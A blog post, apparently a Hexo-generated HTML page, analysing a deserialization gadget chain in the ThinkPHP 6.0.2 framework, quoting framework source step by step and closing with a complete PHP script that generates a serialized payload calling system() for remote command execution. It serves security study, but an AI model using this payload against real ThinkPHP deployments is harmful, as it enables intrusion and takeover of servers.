@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Thinkphpv6.0.2反序列化链 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Thinkphpv6.0.2反序列化链首先我们把__destruct()作为开头，全局搜索__destruct()，发现在think\Model.php里的__destruct()可以使用 123456public function __destruct()&amp;#123;    if ($this-&gt;lazySave) &amp;#123;        $this-&gt;save();    &amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Thinkphpv6.0.2反序列化链">
+<meta property="og:url" content="http://example.com/2021/11/10/Thinkphpv6.0.2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Thinkphpv6.0.2反序列化链首先我们把__destruct()作为开头，全局搜索__destruct()，发现在think\Model.php里的__destruct()可以使用 123456public function __destruct()&amp;#123;    if ($this-&gt;lazySave) &amp;#123;        $this-&gt;save();    &amp;#">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-11-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-11-10T14:12:50.377Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="框架">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 12.5px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/nodejs/" style="font-size: 12.5px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.5px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 11.25px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 13.75px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-Thinkphpv6.0.2反序列化链" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/11/10/Thinkphpv6.0.2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/" class="article-date">
+  	<time datetime="2021-11-09T16:00:00.000Z" itemprop="datePublished">2021-11-10</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Thinkphpv6.0.2反序列化链
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A1%86%E6%9E%B6/" rel="tag">框架</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphpv6-0-2反序列化链"><a href="#Thinkphpv6-0-2反序列化链" class="headerlink" title="Thinkphpv6.0.2反序列化链"></a>Thinkphpv6.0.2反序列化链</h1><p>首先我们把__destruct()作为开头，全局搜索__destruct()，发现在think\Model.php里的__destruct()可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">    if ($this-&gt;lazySave) &#123;</span><br><span class="line">        $this-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里我们需要$this-&gt;lazySave为true，然后看向save，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public function save(array $data = [], string $sequence = null): bool</span><br><span class="line">&#123;</span><br><span class="line">    // 数据对象赋值</span><br><span class="line">    $this-&gt;setAttrs($data);</span><br><span class="line"></span><br><span class="line">    if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#x27;BeforeWrite&#x27;)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);</span><br><span class="line"></span><br><span class="line">    if (false === $result) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 写入回调</span><br><span class="line">    $this-&gt;trigger(&#x27;AfterWrite&#x27;);</span><br><span class="line"></span><br><span class="line">    // 重新记录原始数据</span><br><span class="line">    $this-&gt;origin   = $this-&gt;data;</span><br><span class="line">    $this-&gt;set      = [];</span><br><span class="line">    $this-&gt;lazySave = false;</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们需要到达</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);</span><br></pre></td></tr></table></figure>
+<p>所以我们需要经过一个if，此时需要看向isEmpty()和trigger()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function isEmpty(): bool</span><br><span class="line">&#123;</span><br><span class="line">    return empty($this-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected function trigger(string $event): bool</span><br><span class="line">&#123;</span><br><span class="line">    if (!$this-&gt;withEvent) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>所以如果我们需要绕过第一个if的话，需要$this-&gt;data为空，而$this-&gt;withEvent为false，然后我们绕过第一个if，此时我们看向updateData()和insertData()两个函数，发现updateData()函数有可利用点，所以此时我们需要$this-&gt;exists为true，然后我们看向updateData()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">protected function updateData(): bool</span><br><span class="line">    &#123;</span><br><span class="line">        // 事件回调</span><br><span class="line">        if (false === $this-&gt;trigger(&#x27;BeforeUpdate&#x27;)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $this-&gt;checkData();</span><br><span class="line"></span><br><span class="line">        // 获取有更新的数据</span><br><span class="line">        $data = $this-&gt;getChangedData();</span><br><span class="line"></span><br><span class="line">        if (empty($data)) &#123;</span><br><span class="line">            // 关联更新</span><br><span class="line">            if (!empty($this-&gt;relationWrite)) &#123;</span><br><span class="line">                $this-&gt;autoRelationUpdate();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime &amp;&amp; !isset($data[$this-&gt;updateTime])) &#123;</span><br><span class="line">            // 自动写入更新时间</span><br><span class="line">            $data[$this-&gt;updateTime]       = $this-&gt;autoWriteTimestamp($this-&gt;updateTime);</span><br><span class="line">            $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 检查允许字段</span><br><span class="line">        $allowFields = $this-&gt;checkAllowFields();</span><br></pre></td></tr></table></figure>
+<p>发现可利用点在checkAllowFields()函数，但是要到达这个函数，需要经过两个if，但是由于前面trigger()为true和$data不为空，所以可以直接到checkAllowFields()函数，我们看向checkAllowFields()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">protected function checkAllowFields(): array</span><br><span class="line">&#123;</span><br><span class="line">    // 检测字段</span><br><span class="line">    if (empty($this-&gt;field)) &#123;</span><br><span class="line">        if (!empty($this-&gt;schema)) &#123;</span><br><span class="line">            $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $query = $this-&gt;db();</span><br><span class="line">            $table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable();</span><br><span class="line"></span><br><span class="line">            $this-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $this-&gt;field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>此时我们发现利用点在$this-&gt;db()，所以我们需要$this-&gt;filed为空且this-&gt;schema为空，但是题目就是这两个为空，所以不用管，所以我们看向$this-&gt;db()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function db($scope = []): Query</span><br><span class="line">&#123;</span><br><span class="line">    /** @var Query $query */</span><br><span class="line">    $query = self::$db-&gt;connect($this-&gt;connection)</span><br><span class="line">        -&gt;name($this-&gt;name . $this-&gt;suffix)</span><br><span class="line">        -&gt;pk($this-&gt;pk);</span><br><span class="line"></span><br><span class="line">    if (!empty($this-&gt;table)) &#123;</span><br><span class="line">        $query-&gt;table($this-&gt;table . $this-&gt;suffix);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们可以看到有字符串拼接，所以我们可以利用来触发toString()，此时我们可以构造$this-&gt;suffix为一个类，我们全局搜索__toString()，发现think\model\concern\Conversion.php里的__toString()可以利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后看向toJson()，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function toJson(int $options = JSON_UNESCAPED_UNICODE): string</span><br><span class="line">&#123;</span><br><span class="line">    return json_encode($this-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后看向toArray()，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">public function toArray(): array</span><br><span class="line">   &#123;</span><br><span class="line">       $item       = [];</span><br><span class="line">       $hasVisible = false;</span><br><span class="line"></span><br><span class="line">       foreach ($this-&gt;visible as $key =&gt; $val) &#123;</span><br><span class="line">           if (is_string($val)) &#123;</span><br><span class="line">               if (strpos($val, &#x27;.&#x27;)) &#123;</span><br><span class="line">                   [$relation, $name]          = explode(&#x27;.&#x27;, $val);</span><br><span class="line">                   $this-&gt;visible[$relation][] = $name;</span><br><span class="line">               &#125; else &#123;</span><br><span class="line">                   $this-&gt;visible[$val] = true;</span><br><span class="line">                   $hasVisible          = true;</span><br><span class="line">               &#125;</span><br><span class="line">               unset($this-&gt;visible[$key]);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       foreach ($this-&gt;hidden as $key =&gt; $val) &#123;</span><br><span class="line">           if (is_string($val)) &#123;</span><br><span class="line">               if (strpos($val, &#x27;.&#x27;)) &#123;</span><br><span class="line">                   [$relation, $name]         = explode(&#x27;.&#x27;, $val);</span><br><span class="line">                   $this-&gt;hidden[$relation][] = $name;</span><br><span class="line">               &#125; else &#123;</span><br><span class="line">                   $this-&gt;hidden[$val] = true;</span><br><span class="line">               &#125;</span><br><span class="line">               unset($this-&gt;hidden[$key]);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // 合并关联数据</span><br><span class="line">       $data = array_merge($this-&gt;data, $this-&gt;relation);</span><br><span class="line"></span><br><span class="line">       foreach ($data as $key =&gt; $val) &#123;</span><br><span class="line">           if ($val instanceof Model || $val instanceof ModelCollection) &#123;</span><br><span class="line">               // 关联模型对象</span><br><span class="line">               if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) &#123;</span><br><span class="line">                   $val-&gt;visible($this-&gt;visible[$key]);</span><br><span class="line">               &#125; elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) &#123;</span><br><span class="line">                   $val-&gt;hidden($this-&gt;hidden[$key]);</span><br><span class="line">               &#125;</span><br><span class="line">               // 关联模型对象</span><br><span class="line">               if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) &#123;</span><br><span class="line">                   $item[$key] = $val-&gt;toArray();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; elseif (isset($this-&gt;visible[$key])) &#123;</span><br><span class="line">               $item[$key] = $this-&gt;getAttr($key);</span><br><span class="line">           &#125; elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">               $item[$key] = $this-&gt;getAttr($key);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // 追加属性（必须定义获取器）</span><br><span class="line">       foreach ($this-&gt;append as $key =&gt; $name) &#123;</span><br><span class="line">           $this-&gt;appendAttrToArray($item, $key, $name);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return $item;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>此时我们可以看向toArray()函数的这里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">foreach ($data as $key =&gt; $val) &#123;</span><br><span class="line">    if ($val instanceof Model || $val instanceof ModelCollection) &#123;</span><br><span class="line">        // 关联模型对象</span><br><span class="line">        if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) &#123;</span><br><span class="line">            $val-&gt;visible($this-&gt;visible[$key]);</span><br><span class="line">        &#125; elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) &#123;</span><br><span class="line">            $val-&gt;hidden($this-&gt;hidden[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">        // 关联模型对象</span><br><span class="line">        if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) &#123;</span><br><span class="line">            $item[$key] = $val-&gt;toArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; elseif (isset($this-&gt;visible[$key])) &#123;</span><br><span class="line">        $item[$key] = $this-&gt;getAttr($key);</span><br><span class="line">    &#125; elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">        $item[$key] = $this-&gt;getAttr($key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时我们可以利用这里<br>``<br>$item[$key] = $this-&gt;getAttr($key);</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后看向getAttr()函数</span><br></pre></td></tr></table></figure>
+<pre><code>public function getAttr(string $name)
+&#123;
+    try &#123;
+        $relation = false;
+        $value    = $this-&gt;getData($name);
+    &#125; catch (InvalidArgumentException $e) &#123;
+        $relation = $this-&gt;isRelationAttr($name);
+        $value    = null;
+    &#125;
+
+    return $this-&gt;getValue($name, $value, $relation);
+&#125;
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们此时可以利用getValue()函数，而此时$name为$this-&gt;data[$key]中的$key，而$value为</span><br></pre></td></tr></table></figure>
+<p>$value    = $this-&gt;getData($name);</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以我们看向getData()函数</span><br></pre></td></tr></table></figure>
+<pre><code>public function getData(string $name = null)
+&#123;
+    if (is_null($name)) &#123;
+        return $this-&gt;data;
+    &#125;
+
+    $fieldName = $this-&gt;getRealFieldName($name);
+
+    if (array_key_exists($fieldName, $this-&gt;data)) &#123;
+        return $this-&gt;data[$fieldName];
+    &#125; elseif (array_key_exists($fieldName, $this-&gt;relation)) &#123;
+        return $this-&gt;relation[$fieldName];
+    &#125;
+
+    throw new InvalidArgumentException(&#39;property not exists:&#39; . static::class . &#39;-&gt;&#39; . $name);
+&#125;
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个函数会返回$this-&gt;data[$key]，因此$value为$this-&gt;data[$key]，然后看向getValue()函数</span><br></pre></td></tr></table></figure>
+<pre><code>protected function getValue(string $name, $value, $relation = false)
+&#123;
+    // 检测属性获取器
+    $fieldName = $this-&gt;getRealFieldName($name);
+    $method    = &#39;get&#39; . Str::studly($name) . &#39;Attr&#39;;
+
+    if (isset($this-&gt;withAttr[$fieldName])) &#123;
+        if ($relation) &#123;
+            $value = $this-&gt;getRelationValue($relation);
+        &#125;
+
+        if (in_array($fieldName, $this-&gt;json) &amp;&amp; is_array($this-&gt;withAttr[$fieldName])) &#123;
+            $value = $this-&gt;getJsonValue($fieldName, $value);
+        &#125; else &#123;
+            $closure = $this-&gt;withAttr[$fieldName];
+            $value   = $closure($value, $this-&gt;data);
+        &#125;
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现我们可以动态函数来执行命令</span><br></pre></td></tr></table></figure>
+<pre><code>            $closure = $this-&gt;withAttr[$fieldName];
+            $value   = $closure($value, $this-&gt;data);
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此时只要构造</span><br></pre></td></tr></table></figure>
+<p>$this-&gt;data=[‘b’=&gt;’dir’];<br>$this-&gt;withAttr[‘b’=&gt;’system’];</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">就可以了</span><br><span class="line"></span><br><span class="line">所以根据上面构造exp</span><br></pre></td></tr></table></figure>
+<?php
+
+namespace think;
+
+abstract class Model
+{
+    use model\concern\ModelEvent;
+    use model\concern\Attribute;
+    use model\concern\ModelEvent;
+
+    private $lazySave;
+    private $force;
+    protected $suffix;
+    private $exists;
+    public function __construct($c=''){
+        $this->force=true;
+        $this->lazySave=true;
+        $this->exists=true;
+        $this->suffix=$c;
+    }
+}
+
+namespace think\model\concern;
+
+trait ModelEvent
+{
+    protected $withEvent=false;
+}
+
+
+trait Attribute
+{
+    private $data=['b'=>'dir'];
+    private $withAttr=['b'=>'system'];
+}
+
+
+trait Conversion{
+    protected $visible = ['a' => 'b'];
+}
+
+
+namespace think\model;
+
+use think\Model;
+
+class Pivot extends Model
+{
+
+}
+
+$a=new Pivot();
+$b=new Pivot($a);
+
+echo urlencode(serialize($b));
+?>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">注意：由于Conversion使用trait，所以不可以实例化，所以要用继承这个类的类Model，但是Model是接口，所以也不可以实例化，所以我们需要找继承Model类的Pivot()类，但是由于Pivot类调用了两次，所以用这个方法解决</span><br></pre></td></tr></table></figure>
+<p>abstract class Model<br>{<br>    use model\concern\ModelEvent;<br>    use model\concern\Attribute;<br>    use model\concern\ModelEvent;</p>
+<pre><code>private $lazySave;
+private $force;
+protected $suffix;
+private $exists;
+public function __construct($c=&#39;&#39;)&#123;
+    $this-&gt;force=true;
+    $this-&gt;lazySave=true;
+    $this-&gt;exists=true;
+    $this-&gt;suffix=$c;
+&#125;
+</code></pre>
+<p>}</p>
+<p>$a=new Pivot();<br>$b=new Pivot($a);</p>
+<p>```</p>
+<p>参考文章：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/105777872]">https://blog.csdn.net/qq_42181428/article/details/105777872]</a></p>
+<pre><code>[https://www.freesion.com/article/33321065865/]
+</code></pre>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/11/03/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">thinkPHP5.0.24反序列化链</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="Thinkphpv6.0.2反序列化链" data-title="Thinkphpv6.0.2反序列化链" data-url="http://example.com/2021/11/10/Thinkphpv6.0.2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"  data-images="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" data-content="Thinkphpv6.0.2反序列化链">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
